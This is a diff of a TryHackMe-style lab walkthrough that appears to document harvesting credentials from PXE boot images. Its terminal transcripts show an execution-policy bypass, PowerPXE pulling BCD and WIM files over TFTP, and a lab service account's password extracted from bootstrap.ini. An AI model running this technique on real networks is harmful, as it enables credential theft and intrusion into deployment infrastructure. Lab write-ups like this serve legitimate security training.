@@ -857,37 +857,6 @@ Get-FindCredentials -WimFile pxeboot.wim
 ```
 This should resemble
 ```
-thm@THMJMP1 C:\Users\thm\Documents\UserName>powershell -execution
-policy bypass
-Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.        
-
-PS C:\Users\thm\Documents\UserName> Import-Module .\PowerPXE.ps1 
-PS C:\Users\thm\Documents\UserName>  $BCDFile = "conf.bcd"       
-PS C:\Users\thm\Documents\UserName> Get-WimFile -bcdFile $BCDFile
-
->> Parse the BCD file: conf.bcd
->>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim    
-\Boot\x64\Images\LiteTouchPE_x64.wim
-PS C:\Users\thm\Documents\UserName> tftp -i 10.200.70.202 GET "\B
-oot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
-Transfer successful: 341899611 bytes in 185 second(s), 1848106 by
-tes/s
-PS C:\Users\thm\Documents\UserName>  Get-FindCredentials -WimFile
- pxeboot.wim
->> Open pxeboot.wim 
->>>> Finding Bootstrap.ini 
->>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
->>>> >>>> UserID = svcMDT
->>>> >>>> UserDomain = ZA
->>>> >>>> UserPassword = PXEBootSecure1@
-PS C:\Users\thm\Documents\UserName>  
-
-```
-
-### 4. Recovered Credentials Example
-
-```
 root@ip-10-49-99-152:~# ssh thm@THMJMP1.za.tryhackme.com
 The authenticity of host 'thmjmp1.za.tryhackme.com (10.200.70.248)' can't be established.
 ED25519 key fingerprint is SHA256:50ZqYlTFUYKTHHPzgPNzG0gSydLnknXL0Ea7lUs7tT8.
@@ -922,10 +891,6 @@ c:\powerpxe\README.md
  
 thm@THMJMP1 C:\Users\thm\Documents>cd UserName
  
-thm@THMJMP1 C:\Users\thm\Documents\UserName>ls
-'ls' is not recognized as an internal or external command,       
-operable program or batch file.
- 
 thm@THMJMP1 C:\Users\thm\Documents\UserName>dir
  Volume in drive C is Windows
  Volume Serial Number is 1634-22A9
@@ -941,11 +906,8 @@ thm@THMJMP1 C:\Users\thm\Documents\UserName>dir
                2 Dir(s)  50,779,508,736 bytes free
 
 thm@THMJMP1 C:\Users\thm\Documents\UserName>tftp -i 10.200.70.202
- GET "\Tmp\x64{5087FAC6-F032-4E66-A87C-1A0222B78A0E}.bcd" conf.bc
-d
+ GET "\Tmp\x64{5087FAC6-F032-4E66-A87C-1A0222B78A0E}.bcd" conf.bcd
 Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s   
-
-
 
 
 thm@THMJMP1 C:\Users\thm\Documents\UserName>powershell -execution
@@ -962,10 +924,23 @@ PS C:\Users\thm\Documents\UserName> Get-WimFile -bcdFile $BCDFile
 \Boot\x64\Images\LiteTouchPE_x64.wim
 PS C:\Users\thm\Documents\UserName> tftp -i 10.200.70.202 GET "\B
 oot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
-
-
+Transfer successful: 341899611 bytes in 185 second(s), 1848106 by
+tes/s
+PS C:\Users\thm\Documents\UserName>  Get-FindCredentials -WimFile
+ pxeboot.wim
+>> Open pxeboot.wim 
+>>>> Finding Bootstrap.ini 
+>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
+>>>> >>>> UserID = svcMDT
+>>>> >>>> UserDomain = ZA
+>>>> >>>> UserPassword = PXEBootSecure1@
+PS C:\Users\thm\Documents\UserName>  
 
 ```
+
+### 4. Recovered Credentials Example
+
+
 
 PowerPXE reveals credentials stored in bootstrap.ini:
 ```
